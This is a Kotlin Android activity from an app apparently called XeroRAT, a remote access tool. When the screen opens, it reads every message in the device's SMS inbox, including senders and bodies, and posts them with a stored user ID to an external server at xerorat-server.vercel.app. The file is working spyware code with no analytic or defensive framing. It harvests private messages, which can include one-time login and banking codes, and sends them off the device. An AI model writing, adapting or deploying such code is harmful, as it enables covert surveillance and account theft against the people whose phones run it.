package com.arnabxero.xerorat

import android.content.Context
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import okhttp3.MediaType
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.RequestBody
import org.json.JSONException
import org.json.JSONObject
import java.io.IOException

import java.util.ArrayList
import okhttp3.Request
import okhttp3.Response

class Page2Activity : AppCompatActivity() {
    private lateinit var userIdTextView: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.page2_layout)

        userIdTextView = findViewById(R.id.userIdTextView)

        // Retrieve the user_id from SharedPreferences
        val userId = getUserIdFromLocalStorage()

        // Set the user_id in the TextView
        userIdTextView.text = "User ID: $userId"

        // Fetch SMS Messages
        // Fetch SMS Messages
        val uri = Uri.parse("content://sms/inbox")
        val cursor = contentResolver.query(uri, null, null, null, null)

        if (cursor != null) {
            val smsList = ArrayList<String>()
            val addressIndex = cursor.getColumnIndex("address")
            val bodyIndex = cursor.getColumnIndex("body")
            while (cursor.moveToNext()) {
                val address = if (addressIndex != -1) cursor.getString(addressIndex) else "Unknown"
                val body = if (bodyIndex != -1) cursor.getString(bodyIndex) else "No message body"
                val smsMessage = "From: $address\nMessage: $body"
                smsList.add(smsMessage)
            }
            cursor.close()

            // Convert SMS data to plain text
            val smsText = StringBuilder()
            for (smsMessage in smsList) {
                smsText.append(smsMessage).append("\n")
            }

            // Send SMS data to the server
            sendSmsDataToServer(smsText.toString())
        }
    }

    private fun sendSmsDataToServer(smsData: String) {
        Thread {
            try {
                val client = OkHttpClient()
                val serverUrl =
                    "https://xerorat-server.vercel.app/api/main" // Replace with your server's URL

                // Create a JSON object with the "messages" key and SMS data
                val jsonBody = JSONObject()
                jsonBody.put("messages", smsData)
                jsonBody.put("user_id", getUserIdFromLocalStorage())
                val requestBody = RequestBody.create(
                    "application/json".toMediaTypeOrNull(), jsonBody.toString()
                )
                val request: Request = Request.Builder()
                    .url(serverUrl)
                    .post(requestBody)
                    .build()
                val response: Response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    // Successfully sent data to the server
                    runOnUiThread {
                        Toast.makeText(
                            this@Page2Activity,
                            "SMS data sent to server successfully",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                } else {
                    // Handle errors
                    runOnUiThread {
                        Toast.makeText(
                            this@Page2Activity,
                            "Failed to send SMS data to server",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                }
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }.start()
    }
    private fun getUserIdFromLocalStorage(): String? {
        val sharedPref: SharedPreferences = getSharedPreferences("xerorat_user_id", Context.MODE_PRIVATE)
        return sharedPref.getString("user_id", null)
    }
}
